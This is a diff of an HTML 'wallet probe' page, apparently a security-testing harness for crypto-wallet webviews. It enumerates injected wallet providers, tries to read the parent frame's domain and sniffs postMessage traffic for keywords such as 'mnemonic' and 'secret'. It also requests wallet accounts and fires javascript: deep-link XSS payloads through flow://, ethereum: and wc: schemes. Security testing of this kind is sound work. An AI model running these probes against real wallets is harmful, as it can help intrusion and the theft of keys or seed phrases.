@@ -1,96 +1,89 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Audit - Wallet Flow</title>
+    <title>Ultimate Wallet Probe v2</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; line-height: 1.6; background-color: #f4f4f9; }
-        .container { max-width: 600px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
-        h3 { color: #333; border-bottom: 2px solid #eee; padding-bottom: 10px; }
-        .log-box { background: #222; color: #0f0; padding: 15px; border-radius: 5px; font-family: monospace; font-size: 12px; height: 300px; overflow-y: scroll; margin-bottom: 20px; }
-        .found { color: #ff00ff; font-weight: bold; background: #440044; padding: 2px 5px; }
-        .critical { color: #fff; background: #ff0000; padding: 2px 5px; font-weight: bold; }
-        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; width: 100%; margin-top: 10px; }
-        button:hover { background: #0056b3; }
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; font-size: 12px; }
+        .found { color: #ffff00; font-weight: bold; background: #222; }
+        .error { color: #ff4444; }
+        .critical { color: white; background: red; padding: 2px; }
+        button { background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 5px 0; width: 100%; cursor: pointer; }
+        #log { border-top: 1px solid #333; margin-top: 10px; padding-top: 10px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h3>Wallet Vulnerability Scanner</h3>
-        <div id="log" class="log-box">-- Memulai Pemindaian --<br></div>
-        
-        <button onclick="triggerDeepLink()">Uji Deep Link Bypass</button>
-        <button onclick="location.reload()">Refresh Scan</button>
-    </div>
+    <h3>Ultimate Wallet Probe v2</h3>
+    <button onclick="requestAccount()">1. Request Account (Eth/Flow)</button>
+    <button onclick="scanDeepHidden()">2. Scan Hidden Window Objects</button>
+    <button onclick="testDeepLink()">3. Test URI Scheme Bypass</button>
+    <div id="log"></div>
 
     <script>
-        const logElement = document.getElementById('log');
-
-        function writeLog(msg, type = '') {
-            const span = document.createElement('div');
-            span.innerHTML = [${new Date().toLocaleTimeString()}] ${msg};
-            if (type) span.className = type;
-            logElement.appendChild(span);
-            logElement.scrollTop = logElement.scrollHeight;
+        const logDiv = document.getElementById('log');
+        function log(msg, type='') {
+            const div = document.createElement('div');
+            div.className = type;
+            div.innerHTML = > [${new Date().toLocaleTimeString()}] ${msg};
+            logDiv.prepend(div);
         }
 
-        // 1. Deteksi Provider yang Disuntikkan (Injection Detection)
-        const providers = ['fcl', 'flow', 'ethereum', 'solana', 'trustwallet', 'phantom'];
-        providers.forEach(p => {
-            if (window[p] || (window.parent && window.parent[p])) {
-                writeLog(CRITICAL: Provider window.${p} terdeteksi!, 'found');
-            }
-        });
-
-        // 2. Cek Keamanan Iframe (UXSS/Origin Check)
-        if (window.top !== window.self) {
-            writeLog("Info: Berjalan di dalam Iframe.");
-            try {
-                const parentDomain = window.top.document.domain;
-                writeLog(VULNERABLE: Berhasil akses domain induk: ${parentDomain}, 'critical');
-                alert("UXSS Success! Domain: " + parentDomain);
-            } catch(e) {
-                writeLog("Akses domain induk diblokir (Cross-Origin Policy Aktif).");
-            }
-        }
-
-        // 3. Listener untuk Kebocoran Data (PostMessage sniffing)
-        window.addEventListener("message", (event) => {
-            writeLog(Pesan masuk dari: ${event.origin});
-            const dataStr = JSON.stringify(event.data).toLowerCase();
-            
-            // Mencari kata kunci sensitif
-            const sensitive = ['address', 'token', 'key', 'mnemonic', 'secret', 'auth'];
-            sensitive.forEach(word => {
-                if (dataStr.includes(word)) {
-                    writeLog(SENSITIVE DATA LEAK: Found "${word}" in message!, 'critical');
-                    console.log("Full Data:", event.data);
+        // 1. AUTO-SCAN: Mencari objek yang tidak dikenal di window
+        window.addEventListener('load', () => {
+            log("Memulai scanning objek asing...");
+            const ignore = ["window", "self", "document", "location", "history", "navigation", "webkit", "chrome"];
+            Object.keys(window).forEach(key => {
+                if (!ignore.includes(key) && isNaN(key)) {
+                    try {
+                        if (typeof window[key] === 'object' && window[key] !== null) {
+                            log(OBJEK TERDETEKSI: window.${key}, 'found');
+                        }
+                    } catch(e) {}
                 }
             });
         });
 
-        // 4. Memancing Respon (Probing)
-        const probes = [
-            { type: 'FCL:VIEW:READY' },
-            { type: 'fcl:ready' },
-            { method: 'getAccounts' },
-            { type: 'FLOW::CHALLENGE' }
-        ];
-
-        setTimeout(() => {
-            writeLog("Mengirim probe ke wallet...");
-            probes.forEach(p => {
-                window.parent.postMessage(p, '*');
-            });
-        }, 2000);
-
-        // 5. Deep Link Test
-        function triggerDeepLink() {
-            writeLog("Memicu Deep Link Test...");
-            // Menguji apakah wallet mengeksekusi JS dari skema URL
-            window.location.href = "flow://open?url=javascript:alert('DeepLink_XSS_Success')";
+        // 2. SCANNING MENDALAM: Mencari fungsi 'request' atau 'send'
+        function scanDeepHidden() {
+            log("Mencari fungsi request/send di semua objek...");
+            for (let key in window) {
+                try {
+                    if (window[key] && (window[key].request || window[key].send || window[key].sign)) {
+                        log(CRITICAL: Properti aktif ditemukan di window.${key}, 'critical');
+                    }
+                } catch(e) {}
+            }
         }
+
+        // 3. REQUEST ACCOUNT (Sesuai kode Anda dengan peningkatan)
+        async function requestAccount() {
+            log("Memicu request account...");
+            // Cek Ethereum
+            if (window.ethereum) {
+                window.ethereum.request({ method: 'eth_requestAccounts' })
+                .then(acc => log(SUKSES ETH: ${acc[0]}, 'found'))
+                .catch(e => log(DITOLAK ETH: ${e.message}, 'error'));
+            }
+            // Cek Flow (FCL)
+            if (window.fcl) {
+                window.fcl.authenticate().then(user => log(SUKSES FLOW: ${user.addr}, 'found'));
+            }
+        }
+
+        // 4. TEST DEEP LINK (XSS Bypass)
+        function testDeepLink() {
+            log("Testing URI Scheme...");
+            const payload = "javascript:alert(document.domain)";
+            const schemes = ['flow://open?url=', 'ethereum:send?url=', 'wc:'];
+            schemes.forEach(s => {
+                log(Memicu: ${s});
+                window.location.href = s + payload;
+            });
+        }
+
+        // 5. SNIFFING SEMUA PESAN (Sniffer)
+        window.addEventListener("message", (e) => {
+            log(PESAN MASUK dari ${e.origin}: ${JSON.stringify(e.data)}, 'found');
+        });
     </script>
 </body>
 </html>
